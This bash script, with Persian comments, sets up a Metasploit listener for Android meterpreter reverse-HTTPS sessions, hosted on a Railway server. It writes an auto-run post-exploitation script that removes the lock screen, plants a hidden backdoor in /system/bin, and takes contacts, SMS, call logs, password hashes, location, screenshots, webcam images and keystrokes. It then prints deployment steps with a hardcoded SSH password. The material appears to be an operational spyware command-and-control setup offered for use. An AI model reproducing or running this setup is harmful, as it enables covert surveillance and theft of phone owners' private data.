#!/bin/bash

# Handler for port 443 (HTTPS) - Railway Configuration
# این فایل باید روی Railway اجرا شود

cat > /root/handler_443_professional.rc << 'RC_EOF'
use exploit/multi/handler

set PAYLOAD android/meterpreter/reverse_https
set LHOST 0.0.0.0
set LPORT 443

# SSL Configuration
set HandlerSSLCert /root/.msf4/ssl/cert.pem
set EnableStageEncoding true
set StageEncoder x86/shikata_ga_nai

# Session Configuration
set SessionCommunicationTimeout 600
set SessionExpirationTimeout 1200
set SessionRetryTotal 50
set SessionRetryWait 10
set ExitOnSession false

# Advanced Options
set EnableUnicodeEncoding true
set PrependMigrate true
set PrependMigrateProc com.android.systemui

# Auto-run scripts after session establishment
set AutoRunScript multi_console_command -rc /root/post_exploit_advanced.rc

# Start handler
exploit -j -z
RC_EOF

echo "✅ Handler configuration created: /root/handler_443_professional.rc"

# Create advanced post-exploitation script
cat > /root/post_exploit_advanced.rc << 'POST_EOF'
# Advanced Post-Exploitation for Android
# Runs automatically when session is established

# Wait for session to stabilize
sleep 5

# System Information
sysinfo
getuid

# Persistence
run post/android/manage/remove_lock
run post/android/manage/remove_lock_root

# Install persistent backdoor
execute -f sh -a "-c 'cp /data/local/tmp/payload /system/bin/.sysupdate'"

# Gather information
run post/android/gather/hashdump
run post/android/gather/wireless
screenshot
webcam_snap

# Location tracking
geolocate

# Dump data
run post/android/gather/dump_contacts
run post/android/gather/dump_sms
run post/android/gather/dump_calllog

# Monitor
keyscan_start

# Network information
execute -f "ip addr"
execute -f "netstat -an"

# Keep session alive
execute -f "sh -c 'while true; do sleep 300; done'" -H -d
POST_EOF

echo "✅ Post-exploitation script created: /root/post_exploit_advanced.rc"

echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "🚀 To deploy to Railway:"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "1. Upload configs:"
echo "   sshpass -p 8181 scp -P 55001 handler_443_professional.rc root@crossover.proxy.rlwy.net:/root/"
echo "   sshpass -p 8181 scp -P 55001 post_exploit_advanced.rc root@crossover.proxy.rlwy.net:/root/"
echo ""
echo "2. Start handler on Railway:"
echo "   ssh -p 55001 root@crossover.proxy.rlwy.net"
echo "   pkill msfconsole"
echo "   nohup msfconsole -q -r /root/handler_443_professional.rc > /root/handler_443.log 2>&1 &"
echo ""
echo "3. Monitor handler:"
echo "   tail -f /root/handler_443.log"
echo ""
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "⚠️  IMPORTANT: Railway Port Mapping"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo ""
echo "در Railway Dashboard باید TCP Proxy تنظیم کنید:"
echo ""
echo "  Settings → Networking → TCP Proxying"
echo "  Public Port: 443"
echo "  Internal Port: 443"
echo ""
echo "یا از پورت 4443 استفاده کنید که از قبل در Railway باز است"
echo ""
echo "═══════════════════════════════════════════════════════════════════"
